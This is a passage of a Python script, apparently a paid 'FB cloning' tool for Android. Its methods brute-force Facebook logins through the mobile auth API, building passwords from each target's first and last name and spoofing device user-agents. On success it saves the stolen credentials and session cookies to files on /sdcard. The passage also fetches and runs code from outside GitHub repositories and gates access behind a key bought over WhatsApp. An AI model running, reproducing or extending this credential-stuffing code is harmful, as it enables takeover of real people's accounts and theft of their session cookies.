                                cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{density=1.5,width=854,height=480};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "account_recovery",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'sim_serials': "['80973453345210784798']",
                                        'openid_flow': 'android_login',
                                        'openid_provider': 'google',
                                        'openid_emails': "['01710940017']",
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_MA","client_country_code":"MA",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "AuthOperations$PasswordAuthOperation"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':'45204',
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':'45201',
                                        'x-fb-device-group': '5120',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-friendly-name':'authenticate',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m<❲LUFFY❳-OK> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')
#os.system("espeak -a 300 \"LUFFY,  OK,  YOUCEF,  THANKS,  \"") 
                                        print("\033[1;34m <❲BISCUT-🍪❳> :\033[1;37m "+cookie)           
                                        open('/sdcard/LUFFY_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/LUFFY_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break
                                                                                  
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m<❲LUFFY❳-CP> '+ids+' | '+pas+'\033[1;97m')
                                                #open('/sdcard/LUFFY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)                                                 
                                                break
                                        else:
                                                open('/sdcard/LUFFY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

#<<_________[ METHOD 3 ]_________>>#
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<❲LUFFY❳-M3>×<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{density=1.5,width=854,height=480};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                                ua = random.choice(UBI())
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_DZ","client_country_code":"DZ",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;32m <❲LUFFY❳-OK> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')                 
                                        #print("\033[1;33m [BISCUT-🍪] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/LUFFY_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/LUFFY_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m<❲LUFFY❳-CP> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/LUFFY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/LUFFY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

#<<_________[ METHOD 4 ]_________>>#
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m<❲LUFFY❳-M4>×<[%s| \033[1;32mOK\033[1;37m|\033[1;34mCP \033[1;32m%s\033[1;37m|\033[1;34m%s\033[1;37m]> '%(loop,len(oks),len(cps)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                                android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                                facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                                fbbv = str(random.randint(10000000, 99999999))
                                fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                                density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                                width = random.randint(720, 1440)
                                height = random.randint(1080, 2560)
                                fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                                fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                                ua = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748689;FBDM/{density=2.625,width=1080,height=1920};FBLC/en_US;FBRV/104800574;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-N920A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/83.0.0.20.71;FBBV/32723414;FBDM/{density=1.5,width=480,height=800};FBLC/ar_AR;FBCR/KOREK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9060I;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/81.0.0.22.70;FBBV/31880433;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G316M;FBSV/4.4.4;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/86.0.0.19.69;FBBV/34022659;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.23.70;FBBV/32429830;FBDM/{density=1.5,width=540,height=960};FBLC/fr_FR;FBCR/MTN-CG;FBMF/HOTWAV;FBBD/HOTWAV;FBPN/com.facebook.katana;FBDV/Venus X1;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/82.0.0.20.70;FBBV/32367061;FBDM/{density=1.5,width=854,height=480};FBLC/es_LA;FBCR/OUI;FBMF/LAVA;FBBD/Lava;FBPN/com.facebook.katana;FBDV/iris702;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_DZ","client_country_code":"DZ",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'Host': 'graph.facebook.com',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'X-FB-Connection-Type': 'MOBILE.LTE',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-device-group': '5120',
                                        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'X-FB-Client-IP': 'True',
                                        'X-FB-Server-Cluster': 'True',
                                        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                                        'x-fb-friendly-name':'ViewerReactionsMutation',
                                        'X-FB-Request-Analytics-Tags': 'graphservice',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\r\033[1;32m<❲LUFFY❳-OK> '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')                 
                                       # print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/LUFFY_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/LUFFY_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;34m<❲LUFFY❳-CP> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/LUFFY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/LUFFY-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass              
                        
#####_____Unblock-Network-Ip_____#####
def createip():
	os.system("cd && git clone https://github.com/mafiat2/XYLON16")
	os.system('cd && cd XYLON16 ;python IP16.py')
#####_____END_____#####


#####_____Create-File_____#####
def create():
	os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
	os.system('cd && cd FILE ;python FILE.py')
#####_____END_____#####
                        
def main_apv():
    os.system("clear")
    print(logo)
    uuid = str(os.geteuid())
    Xyteee=('M16x6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f" Your Key : \x1b[1;31m"+Xyteee)
    print('\033[1;34m═════════════════════════════════════════')
    try:
        system = requests.get("https://mafia166.blogspot.com/2024/03/m1.html").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            menu()
            pass 
        else: 
            print(f"\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37mTHIS IS PAID TOOL [💸]")
            print(f"\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37mSEND YOUR KEY ADMIN [💸]")
            print('\033[1;34m═════════════════════════════════════════\033[1;97m')
            print('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37m Notes : MAFIA Tools Can buy in all countries!')
            print('\033[1;34m═════════════════════════════════════════\033[1;97m')
            print('\033[1;32m[\033[1;31m1\033[1;32m] \033[1;37m 8$ \033[1;92mApproval For 1 month')
            print('\033[1;32m[\033[1;31m2\033[1;32m] \033[1;37m 6$ \033[1;92mApproval For 15 days')
            print('\033[1;32m[\033[1;31m3\033[1;32m] \033[1;37m 3$ \033[1;92mApproval For 7 days \033[1;37m')
            print('\033[1;34m═════════════════════════════════════════')
            Picchi = input('\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37mSelect Buy Option : ')
            os.system("clear")
            print(logo)
            print(f"\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37mYOUR KEY : \033[31;1m{Xyteee}")
            print("\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37mTools    : FB Cloning");print(" \033[1;92m\n \033[1;32m[\033[1;31m-\033[1;32m] \033[1;37mNote: If You Are Free User Don't Come IB\033[0;0m");print(' \033[1;32m[\033[1;31m1\033[1;32m] \033[1;37mCRACK FILE  \n \033[1;32m[\033[1;31m2\033[1;32m] \033[1;37mExit Program')
            print('\033[1;34m═════════════════════════════════════════')
            url_wa = "https://api.whatsapp.com/send?phone=+213558926136&text="
            choice = input(" \033[1;37m❲\033[1;37m=\033[1;37m❳ \033[1;32mEnter your choice  : ")
            tks = ("Hi MAFIA Sir, I Need To Buy Your MAFIA Tools Version 4.22 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
            subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
            print('\033[1;34m═════════════════════════════════════════\nRun\033[1;32m[\033[1;31m-\033[1;32m] \033[1;37m again with permission from admin')
            main_apv()
    except: 
        sys.exit()

with tred(max_workers=30) as rhu:
 #   rhu.submit(sexy)
    rhu.submit(menu)